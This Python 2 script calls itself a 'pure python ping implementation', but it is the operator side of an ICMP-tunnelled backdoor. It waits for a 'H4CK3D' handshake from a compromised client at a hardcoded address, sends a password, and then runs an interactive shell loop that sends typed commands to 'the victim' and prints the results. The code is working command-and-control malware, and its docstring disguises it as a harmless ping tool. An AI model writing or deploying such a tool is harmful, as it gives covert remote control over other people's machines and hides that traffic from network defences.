#!/usr/bin/env python
# encoding: utf-8
"""
"  A pure python ping implementation using raw socket.
"  ICMP messages can only be sent from processes running as root.
"""

import os, sys, socket, struct, select, time, string, argparse, IN
from ICMP_connection import ICMP

#CHANGE HERE!
host = "10.0.24.6"



"""
" Function to send the command typed to the victim and get the return
"""
def execute_commands(icmp_helper):
    timeout = 10
    command = ""
    while command != "exit":
        try:
           command = raw_input("root@" + icmp_helper.dest + " $")
           icmp_helper.send(command)
           data = icmp_helper.receive(timeout)
           if(secret_handshake in data):
               icmp_helper.clearID()
               print "the client has disconnected"
               print "re-login..."
               return 1
           print data
        except KeyboardInterrupt:
           break
    return 0


# destination = "127.0.0.1"
icmp_helper = ICMP(host, None)
timeout = 10

#for a real application it's better to use a bigger and more complex string :)
secret_handshake = "H4CK3D"

# Wait connection from client
print "Starting program..."
print "Waiting for connection..."
keep_program_alive = 1
while keep_program_alive:
    try:
        print "Expecting handshake"
        data = icmp_helper.receive(timeout)
        # print repr(data)
        try:
            if(secret_handshake in data):
                password = raw_input("Enter the password:\n")
                icmp_helper.send(password)
                print "Expecting OK"
                data = icmp_helper.receive(timeout)
                if("OK" in data):
                    print "Connected!"
                    keep_program_alive = execute_commands(icmp_helper)
                else:
                    print "Connection failed, wrong password."
            else:
                print "Connection failed, retrying..."
            print "-------------------"
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except TypeError:
            print "Timeout..."
    except KeyboardInterrupt:
        break

icmp_helper.close()
